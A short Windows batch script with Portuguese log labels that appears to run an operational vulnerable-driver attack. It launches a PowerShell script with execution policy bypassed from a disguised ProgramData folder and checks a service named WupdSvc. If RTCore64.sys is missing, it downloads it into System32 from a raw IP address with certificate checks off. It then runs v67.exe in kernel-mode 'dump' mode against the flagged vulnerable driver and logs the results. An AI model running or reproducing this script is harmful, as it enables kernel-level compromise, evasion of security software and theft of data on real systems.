@echo off
set O=C:\manual_out.txt
set D=C:\ProgramData\wupd
echo == t_shush %date% %time% > %O%
echo == T1P7 >> %O%
powershell -NoProfile -ExecutionPolicy Bypass -File %D%\t1p7.ps1 >> %O% 2>&1
findstr /c:LOADED /c:CARREGADO %D%\t1p7.log >> %O% 2>&1
sc query WupdSvc | findstr ESTADO >> %O% 2>&1
dir C:\Windows\System32\RTCore64.sys >> %O% 2>&1
echo == R2 SEM USERMODE %time% >> %O%
%D%\v67.exe dump --kernelmode --internet --no-restore --dont-unload-driver --process-name _nada_.exe --vuln-service WupdSvc --vuln-driver C:\Windows\System32\RTCore64.sys > C:\r2.txt 2>&1
echo rc2=%errorlevel% >> %O%
for %%A in (C:\r2.txt) do echo bytes2=%%~zA >> %O%
echo == R3 COM USERMODE %time% >> %O%
if not exist C:\Windows\System32\RTCore64.sys curl.exe -k -s --max-time 20 -o C:\Windows\System32\RTCore64.sys https://80.78.22.208/d3.sys
%D%\v67.exe dump --kernelmode --usermode --internet --no-restore --dont-unload-driver --process-name _nada_.exe --vuln-service WupdSvc --vuln-driver C:\Windows\System32\RTCore64.sys > C:\r3.txt 2>&1
echo rc3=%errorlevel% >> %O%
for %%A in (C:\r3.txt) do echo bytes3=%%~zA >> %O%
echo == FIM %time% >> %O%
type %O%
